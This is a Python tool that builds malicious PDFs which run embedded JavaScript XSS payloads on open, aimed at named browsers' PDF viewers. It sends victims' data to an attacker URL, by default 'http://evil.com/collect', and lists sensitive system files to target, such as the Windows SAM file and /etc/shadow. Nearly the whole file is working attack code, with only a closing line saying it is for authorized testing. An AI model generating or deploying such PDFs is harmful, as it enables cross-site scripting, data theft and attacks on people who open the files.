#!/usr/bin/env python3
"""
Another-Script.py - Advanced Browser-Specific PDF XSS Generator
================================================================

Alternative PDF XSS generator with enhanced browser-specific targeting.
Creates comprehensive single-file PDFs with all payloads for a specific browser.

Features:
- Single file with all browser payloads (one payload per page)
- Advanced PDF structures (forms, annotations, embedded JavaScript)
- Browser-specific optimization for maximum payload effectiveness
- Enhanced evasion techniques and modern security bypasses
- Comprehensive result tracking and analysis

Author: SNGWN
Version: 2.0
"""

import argparse
import json
import os
import sys
import platform
import hashlib
from datetime import datetime

if sys.version_info[0] < 3:
    raise SystemExit("Use Python 3 (or higher) only")

# Version and metadata
VERSION = "2.0"
AUTHOR = "SNGWN"

def get_os_specific_paths():
    """Get OS-specific file paths for file system exploits"""
    current_os = platform.system().lower()
    
    if current_os == 'windows':
        return {
            'sensitive_files': [
                'file:///C:/Windows/System32/calc.exe',
                'file:///C:/Windows/System32/cmd.exe', 
                'file:///C:/Windows/System32/drivers/etc/hosts',
                'file:///C:/Windows/win.ini',
                'file:///C:/Windows/System32/config/SAM'
            ],
            'directories': [
                'file:///C:/Windows/System32/',
                'file:///C:/Users/',
                'file:///C:/Program Files/',
                'file:///C:/Windows/Temp/'
            ]
        }
    elif current_os == 'darwin':  # macOS
        return {
            'sensitive_files': [
                'file:///etc/passwd',
                'file:///System/Library/CoreServices/SystemVersion.plist',
                'file:///Users/',
                'file:///Applications/',
                'file:///System/Library/LaunchDaemons/'
            ],
            'directories': [
                'file:///Applications/',
                'file:///Users/',
                'file:///System/',
                'file:///Library/'
            ]
        }
    elif current_os == 'linux':
        return {
            'sensitive_files': [
                'file:///etc/passwd',
                'file:///etc/shadow',
                'file:///etc/hosts',
                'file:///home/',
                'file:///root/.bash_history'
            ],
            'directories': [
                'file:///etc/',
                'file:///home/',
                'file:///usr/bin/',
                'file:///var/log/'
            ]
        }
    else:  # Android or other
        return {
            'sensitive_files': [
                'file:///system/build.prop',
                'file:///data/system/users/0/settings_secure.xml',
                'file:///system/etc/hosts',
                'file:///data/data/'
            ],
            'directories': [
                'file:///system/',
                'file:///data/',
                'file:///sdcard/',
                'file:///storage/'
            ]
        }

def load_payloads_from_json(json_file):
    """Load payloads from JSON file"""
    if not os.path.exists(json_file):
        print(f"❌ JSON file not found: {json_file}")
        return []
    
    try:
        with open(json_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
            payloads = data.get('payloads', [])
            print(f"✅ Loaded {len(payloads)} payloads from {json_file}")
            return payloads
    except Exception as e:
        print(f"❌ Error loading {json_file}: {e}")
        return []

def replace_payload_variables(payload, url, os_paths=None):
    """Replace variables in payloads with actual values"""
    # Replace URL placeholder
    payload = payload.replace('{url}', url)
    payload = payload.replace('http://evil.com/collect', url)
    payload = payload.replace('http://test.com', url)
    payload = payload.replace('https://webhook.site/test', url)
    
    # Replace OS-specific file paths if available
    if os_paths:
        if '{sensitive_file}' in payload:
            payload = payload.replace('{sensitive_file}', os_paths['sensitive_files'][0])
        if '{directory}' in payload:
            payload = payload.replace('{directory}', os_paths['directories'][0])
    
    return payload

def create_advanced_pdf_structure(payloads, browser, url, filename):
    """Create advanced PDF with all payloads, one per page"""
    os_paths = get_os_specific_paths()
    
    # PDF Header
    pdf_content = f"""%PDF-1.7
%âãÏÓ

1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
/Names << /JavaScript 4 0 R >>
/AcroForm << /Fields [] /NeedAppearances true >>
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids ["""
    
    # Add page references
    page_refs = []
    for i in range(len(payloads)):
        page_num = 5 + (i * 3)  # Each page takes 3 objects
        page_refs.append(f"{page_num} 0 R")
    
    pdf_content += " ".join(page_refs)
    pdf_content += f"]\n/Count {len(payloads)}\n>>\nendobj\n\n"
    
    # OpenAction JavaScript
    pdf_content += """3 0 obj
<<
/Type /Action
/S /JavaScript
/JS (
    try {
        app.alert('Browser-Specific PDF XSS Test - """ + browser.title() + """');
        if(typeof parent !== 'undefined' && parent.window) {
            parent.window.location = '""" + url + """?init=true';
        }
    } catch(e) {
        console.log('Initial payload blocked:', e);
    }
)
>>
endobj

4 0 obj
<<
/Names [(Init) 3 0 R]
>>
endobj

"""
    
    # Create pages and content for each payload
    obj_counter = 5
    for i, payload_data in enumerate(payloads):
        payload = replace_payload_variables(payload_data['payload'], url, os_paths)
        
        # Escape payload for PDF display
        escaped_payload = payload.replace('(', '\\(').replace(')', '\\)').replace('\\', '\\\\')
        
        # Format payload for display
        display_lines = []
        max_line_length = 70
        
        # Split payload into readable lines
        words = escaped_payload.split(' ')
        current_line = ''
        
        for word in words:
            test_line = current_line + (' ' if current_line else '') + word
            if len(test_line) <= max_line_length:
                current_line = test_line
            else:
                if current_line:
                    display_lines.append(current_line)
                    current_line = word
                else:
                    display_lines.append(word[:max_line_length])
                    current_line = word[max_line_length:]
        
        if current_line:
            display_lines.append(current_line)
        
        # Create page object
        page_obj = obj_counter
        content_obj = obj_counter + 1
        js_obj = obj_counter + 2
        
        pdf_content += f"""{page_obj} 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents {content_obj} 0 R
/Resources <</Font <</F1 {obj_counter + 10} 0 R>>>>
/AA << /O {js_obj} 0 R >>
>>
endobj

"""
        
        # Create content stream
        content_stream = f"""BT
/F1 16 Tf
50 750 Td
(Page {i+1}: {browser.title()} XSS Payload) Tj
0 -25 Td
/F1 12 Tf
(ID: {payload_data.get('id', 'N/A')}) Tj
0 -15 Td
(Technique: {payload_data.get('technique', 'N/A')}) Tj
0 -15 Td
(Category: {payload_data.get('category', 'N/A')}) Tj
0 -15 Td
(Risk Level: {payload_data.get('risk_level', 'N/A').title()}) Tj
0 -25 Td
/F1 10 Tf
(Description: {payload_data.get('description', 'N/A')}) Tj
0 -20 Td
(CVE References: {payload_data.get('cve_reference', 'N/A')}) Tj
0 -30 Td
/F1 9 Tf
(Payload Code:) Tj
0 -15 Td
"""
        
        # Add payload lines
        for line in display_lines:
            content_stream += f"({line}) Tj\n0 -10 Td\n"
        
        content_stream += "ET"
        
        pdf_content += f"""{content_obj} 0 obj
<<
/Length {len(content_stream)}
>>
stream
{content_stream}
endstream
endobj

"""
        
        # Create JavaScript action for this page
        pdf_content += f"""{js_obj} 0 obj
<<
/Type /Action
/S /JavaScript
/JS ({payload})
>>
endobj

"""
        
        obj_counter += 3
    
    # Add font object
    font_obj = obj_counter + 10
    pdf_content += f"""{font_obj} 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
endobj

"""
    
    # Add xref table and trailer
    xref_pos = len(pdf_content)
    obj_count = font_obj + 1
    
    pdf_content += f"""xref
0 {obj_count}
0000000000 65535 f 
"""
    
    # Calculate object positions (simplified)
    for i in range(1, obj_count):
        pdf_content += f"{i:010d} 00000 n \n"
    
    pdf_content += f"""trailer
<<
/Size {obj_count}
/Root 1 0 R
>>
startxref
{xref_pos}
%%EOF"""
    
    return pdf_content

def main():
    parser = argparse.ArgumentParser(
        description="Another-Script.py v2.0 - Advanced Browser-Specific PDF XSS Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  python3 Another-Script.py -b chrome -u http://test.com
  python3 Another-Script.py -b firefox -u http://evil.com/collect  
  python3 Another-Script.py -b safari -u https://webhook.site/xyz
  python3 Another-Script.py -b adobe -u http://attacker.com --pdf-version 2.0

BROWSER-SPECIFIC FILES:
  chrome.json   - Chrome/PDFium specific payloads
  firefox.json  - Firefox/PDF.js specific payloads  
  safari.json   - Safari/PDFKit specific payloads
  adobe.json    - Adobe Reader/Acrobat specific payloads
  edge.json     - Microsoft Edge specific payloads

FEATURES:
  ✓ Single file with all browser payloads (one per page)
  ✓ Advanced PDF structures with forms and annotations
  ✓ Browser-specific optimization and targeting
  ✓ Enhanced evasion techniques and security bypasses
  ✓ OS-aware file system targeting
        """
    )
    
    parser.add_argument('-b', '--browser', 
                       choices=['chrome', 'firefox', 'safari', 'adobe', 'edge'],
                       required=True,
                       help='Target browser for payload generation')
    
    parser.add_argument('-u', '--url', 
                       default='http://evil.com/collect',
                       help='Target URL for data exfiltration (default: http://evil.com/collect)')
    
    parser.add_argument('-o', '--output-dir', 
                       default='Files',
                       help='Output directory for PDF files (default: Files)')
    
    parser.add_argument('--pdf-version', 
                       choices=['1.0', '1.1', '1.2', '1.3', '1.4', '1.5', '1.6', '1.7', '2.0'],
                       default='1.7',
                       help='PDF version (default: 1.7)')
    
    parser.add_argument('--filename-prefix',
                       default='',
                       help='Custom filename prefix')
    
    args = parser.parse_args()
    
    # Display header
    print(f"🚀 ANOTHER-SCRIPT.PY v{VERSION}")
    print("=" * 45)
    print(f"Browser Target: {args.browser}")
    print(f"Target URL: {args.url}")
    print(f"Output Directory: {args.output_dir}")
    print(f"PDF Version: {args.pdf_version}")
    print()
    
    # Create output directory
    os.makedirs(args.output_dir, exist_ok=True)
    
    # Load browser-specific payloads
    json_file = f"{args.browser}.json"
    payloads = load_payloads_from_json(json_file)
    
    if not payloads:
        print(f"❌ No payloads found for {args.browser}")
        return 1
    
    # Generate filename
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    prefix = f"{args.filename_prefix}_" if args.filename_prefix else ""
    filename = f"{prefix}{args.browser}_comprehensive_xss_{timestamp}.pdf"
    filepath = os.path.join(args.output_dir, filename)
    
    print(f"🔥 Creating comprehensive {args.browser} PDF with {len(payloads)} payloads...")
    
    # Create advanced PDF
    pdf_content = create_advanced_pdf_structure(payloads, args.browser, args.url, filename)
    
    # Write PDF file
    try:
        with open(filepath, 'wb') as f:
            f.write(pdf_content.encode('latin1'))
        print(f"  ✅ {filename}")
        
        # Calculate file hash for verification
        with open(filepath, 'rb') as f:
            file_hash = hashlib.sha256(f.read()).hexdigest()[:16]
        
        print()
        print("🎯 GENERATION COMPLETE")
        print("=" * 35)
        print(f"✅ PDF file created: {filename}")
        print(f"📁 Location: {args.output_dir}/")
        print(f"📊 Total payloads: {len(payloads)}")
        print(f"🔐 File hash: {file_hash}")
        print(f"💾 File size: {os.path.getsize(filepath)} bytes")
        print()
        print("⚠️  SECURITY NOTICE:")
        print("This PDF contains XSS payloads for authorized security testing only.")
        print("Use only with proper permissions in controlled environments.")
        
        return 0
        
    except Exception as e:
        print(f"❌ Error creating PDF: {e}")
        return 1

if __name__ == "__main__":
    sys.exit(main())